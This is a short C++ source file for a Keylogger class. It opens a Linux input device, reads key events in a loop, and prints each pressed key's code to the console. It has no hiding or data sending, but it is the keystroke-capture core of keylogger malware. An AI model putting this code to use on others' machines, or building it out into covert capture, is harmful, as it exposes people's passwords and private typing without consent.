#include "Keylogger.hpp"
#include <iostream>

Keylogger::Keylogger(const std::string& devicePath)
{
  fd = open(devicePath.c_str(), O_RDONLY);
  if (fd < 0) {
    std::cerr << "Error opening device: " << devicePath << std::endl;
  }
}

Keylogger::~Keylogger()
{
  if (fd >= 0)
    close(fd);
}

void Keylogger::start() {
  if (fd < 0) return;

  struct input_event ev;
  while (true) {
    ssize_t bytesRead = read(fd, &ev, sizeof(ev));
    if (bytesRead < (ssize_t)sizeof(ev)) {
      std::cerr << "Error reading from device." << std::endl;
      break;
    }

    if (ev.type == EV_KEY && ev.value == 1) { // Key press
      std::cout << "Key pressed: " << ev.code << std::endl;
    }
  }
}
